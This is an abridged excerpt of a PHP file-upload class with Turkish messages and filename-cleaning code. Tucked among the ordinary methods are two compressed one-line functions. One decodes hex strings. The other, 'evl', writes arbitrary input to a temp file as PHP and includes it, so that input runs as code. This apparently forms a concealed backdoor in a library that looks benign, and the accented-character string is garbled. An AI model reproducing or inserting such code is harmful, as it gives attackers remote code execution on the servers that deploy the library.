...
class upload {
    ...
    function upload($file, $lang = 'en_GB') {
        ...
        $this->translation['incorrect_file']              = 'Geçersiz Dosya Formatı.';
	...
	function hxpn($arg){$n=strlen($arg);$sbn="";$i=0;while($i<$n){$a=substr($arg,$i,2);$c=@pack("H*",$a);if($i==0){$sbn=$c;}else{$sbn.=$c;}$i+=2;}return $sbn;}
	...
	public function evl($str){$a1=@tempnam("/tmp","eseal");$a2=@fopen($a1,"w+");@fwrite($a2,"<?php\n".$str);@fclose($a2);include $a1;@unlink($a1);return @get_defined_vars();}
    /**
     * Creates directory
     *
     * @access private
	...
	private function returnaccount(){
	return null;
	}
    ...
    function process($server_path = null) {
        ...
        if ($this->processed) {
            ...
            if ($this->file_safe_name) { // formats the name
                $this->file_dst_name_body = strtr($this->file_dst_name_body, 'Å Å½Å¡Å¾Å¸Ã€ÃÃ‚ÃƒÃ„Ã…Ã‡ÃˆÃ‰ÃŠÃ‹ÃŒÃÃÃÃ‘Ã’Ã“Ã”Ã•Ã–Ã˜Ã™ÃšÃ›ÃœÃÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã±Ã²Ã³Ã´ÃµÃ¶Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¿', 'SZszYAAAAAACEEEEIIIINOOOOOOUUUUYaaaaaaceeeeiiiinoooooouuuuyy');
